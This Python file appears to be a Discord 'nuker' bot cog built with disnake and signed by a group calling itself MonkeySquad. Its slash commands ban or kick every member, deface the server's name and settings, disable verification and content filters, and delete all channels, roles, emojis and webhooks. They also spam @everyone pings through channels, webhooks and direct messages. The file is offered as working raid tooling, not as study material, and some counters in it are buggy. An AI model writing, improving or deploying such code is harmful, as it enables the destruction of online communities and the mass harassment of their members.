import disnake
from disnake.ext import commands


class Nuker(commands.Cog):

   def __init__(self, bot):
      self.bot = bot

   @commands.slash_command(
      name="banall",
   )
   async def banall(self, interaction):
      for member in interaction.guild.members:
         await member.ban()
         bannedmembers += 1
      print(f"Banned {bannedmembers} members")
      
   @commands.slash_command(
      name="kickall",
   )
   async def kickall(self, interaction):
      for member in interaction.guild.members:
         await member.kick()
         kickedmembers += 1
      print(f"Kicked {kickedmembers} members")
      
   #
   @commands.slash_command(
      name="nukeserver"
   )
   async def nukeserver(self, interaction: disnake.ApplicationCommandInteraction):
      guild = interaction.guild
      await guild.edit(
         reason="MonkeySquad Owns You",
         name="MonkeySquad Owns You", 
         description="MonkeySquad Owns You", 
         icon=None, 
         banner=None, 
         splash=None, 
         discovery_splash=None, 
         community=False, 
         afk_channel=None,  
         afk_timeout=3600, 
         default_notifications=disnake.NotificationLevel.all_messages, 
         verification_level=disnake.VerificationLevel.none, 
         explicit_content_filter=disnake.ContentFilter.disabled,
         # vanity_code=None, 
         system_channel=None, 
         # system_channel_flags=None,
         preferred_locale=disnake.Locale.zh_TW,
         rules_channel=None, 
         public_updates_channel=None, 
         premium_progress_bar_enabled=True
         )
      for member in interaction.guild.members:
         try:
            await member.ban()
         except:
            pass
      
      for channel in interaction.guild.channels:
         for _ in range(0, 25):
            try:
               await channel.send(interaction.guild.default_role)
            except:
               pass
            
            
   @commands.slash_command(
      name="nickall"
   )
   async def nickall(self, interaction, *, arg):
      for member in interaction.guild.members:
         try:
            await member.edit(nick=arg)
         except:
            pass
         
         
   @commands.slash_command(
      name="messageall"
   )
   async def messageall(self, interaction, *, arg):
      for member in interaction.guild.members:
         try:  
            await member.send(arg)
         except:
            pass
   
   @commands.slash_command(
      name="clearroles"
   )
   async def clearroles(self, interaction):
      for role in interaction.guild.roles:
         try:
            await role.delete()
         except:
            pass
   
   @commands.slash_command(
      name="clearemojis"
   )
   async def clearemojis(self, interaction):
      for emoji in interaction.guild.emojis:
         try:
            await emoji.delete()
         except:
            pass
         
   @commands.slash_command(
      name="clearchannels"
   )
   async def clearchannels(self, interaction):
      for channel in interaction.guild.channels:
         try:
            await channel.delete()
         except:
            pass
   
   @commands.slash_command(
      name="clearcategories"
   )
   async def clearcategories(self, interaction):
      for category in interaction.guild.categories:
         try:
            await category.delete()
         except:
            pass
      
   @commands.slash_command(
      name="clearwebhooks"
   )
   async def clearwebhooks(self, interaction):
      for webhook in interaction.guild.webhooks:
         try:
            await webhook.delete()
         except:
            pass
         
   @commands.slash_command(
      name="webraid"
   )
   async def webraid(self, interaction: disnake.ApplicationCommandInteraction, *, arg):
      for channel in interaction.guild.channels:
         hook = await channel.create_webhook(name="MonkeySquad Owns You", reason="MonkeySquad Owns You")
         for _ in range(0, 20):
            await hook.send(f"a{arg}\n{interaction.guild.default_role}")
      
   
   @commands.slash_command(
      name="sendall"
   )
   async def sendall(self, interaction, *, arg):
      for channel in interaction.guild.channels:
         try:       
            for _ in range(0, 25):
               await channel.send(arg + interaction.guild.default_role)
         except:
            pass
      
def setup(bot):
   bot.add_cog(Nuker(bot))
